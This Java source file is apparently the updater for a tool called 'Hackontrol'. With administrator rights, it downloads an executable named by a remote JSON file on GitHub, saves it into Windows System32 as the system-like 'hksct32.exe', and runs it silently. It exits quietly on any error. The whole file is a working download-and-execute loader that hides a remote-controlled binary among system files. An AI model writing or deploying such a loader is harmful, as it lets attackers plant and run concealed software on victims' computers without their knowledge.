package com.khopan.hackontrol.updater;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URI;
import java.net.URLConnection;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;

import com.fasterxml.jackson.databind.JsonNode;
import com.fasterxml.jackson.databind.ObjectMapper;

public class HackontrolUpdater {
	private static final String FILE_NAME = "hksct32.exe";

	public static void main(String[] args) throws Throwable {
		if(!Administrator.hasAdministratorPrivileges()) {
			System.exit(1);
			return;
		}

		String windowsDirectoryPath = System.getenv("windir");

		if(windowsDirectoryPath == null) {
			System.exit(1);
			return;
		}

		File windowsDirectory = new File(windowsDirectoryPath);

		if(!windowsDirectory.exists()) {
			System.exit(1);
			return;
		}

		File system32Directory = new File(windowsDirectory, "System32");

		if(!system32Directory.exists()) {
			System.exit(1);
			return;
		}

		File file = new File(system32Directory, HackontrolUpdater.FILE_NAME);
		ObjectMapper mapper = new ObjectMapper();
		JsonNode node;

		try {
			HttpURLConnection connection = (HttpURLConnection) new URI("https://raw.githubusercontent.com/KHOPAN/Hackontrol/main/version.json").toURL().openConnection();
			connection.setRequestMethod("GET");
			connection.setDoInput(true);
			connection.connect();
			InputStream stream = connection.getInputStream();
			byte[] data = stream.readAllBytes();
			stream.close();
			node = mapper.readTree(new String(data, StandardCharsets.UTF_8));
		} catch(Throwable ignored) {
			System.exit(1);
			return;
		}

		if(!node.has("hash")) {
			System.exit(1);
			return;
		}

		String hash = node.get("hash").asText();

		if(file.exists()) {
			FileInputStream stream = new FileInputStream(file);
			byte[] data = stream.readAllBytes();
			stream.close();
			String fileHash = HackontrolUpdater.hash(data);

			if(hash.equals(fileHash)) {
				HackontrolUpdater.execute(system32Directory);
				return;
			}
		}

		if(!node.has("download")) {
			System.exit(1);
			return;
		}

		String download = node.get("download").asText();
		URLConnection connection = new URI(download).toURL().openConnection();
		InputStream stream = connection.getInputStream();
		byte[] data = stream.readAllBytes();
		stream.close();
		String fileHash = HackontrolUpdater.hash(data);

		if(!hash.equals(fileHash)) {
			System.exit(1);
			return;
		}

		FileOutputStream outputStream = new FileOutputStream(file);
		outputStream.write(data);
		outputStream.close();
		HackontrolUpdater.execute(system32Directory);
	}

	private static void execute(File directory) {
		try {
			ProcessBuilder builder = new ProcessBuilder(HackontrolUpdater.FILE_NAME);
			builder.directory(directory);
			builder.start();
		} catch(Throwable ignored) {
			ignored.printStackTrace();
		}
	}

	private static String hash(byte[] input) {
		try {
			MessageDigest digest = MessageDigest.getInstance("SHA512");
			byte[] hash = digest.digest(input);
			StringBuilder builder = new StringBuilder();

			for(int i = 0; i < hash.length; i++) {
				builder.append(String.format("%02x", hash[i]));
			}

			return builder.toString();
		} catch(Throwable ignored) {
			return "";
		}
	}
}
